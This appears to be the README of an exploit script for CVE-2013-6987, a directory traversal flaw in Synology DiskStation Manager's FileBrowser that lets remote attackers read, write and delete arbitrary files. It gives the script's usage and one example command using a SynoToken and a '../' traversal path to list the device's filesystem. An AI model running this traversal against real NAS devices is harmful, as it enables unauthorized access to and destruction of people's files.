# CVE-2013-6987

Multiple directory traversal vulnerabilities in the FileBrowser components in Synology DiskStation Manager (DSM) before 4.3-3810 Update 3 allow remote attackers to read, write, and delete arbitrary files via a .. (dot dot) 

# Usage:

	python <file.py> <SynoToken> <path>
	
	example:
		#list filesystem
		python file_list.py ABCDFEGH1234 /home/../../../../	
	
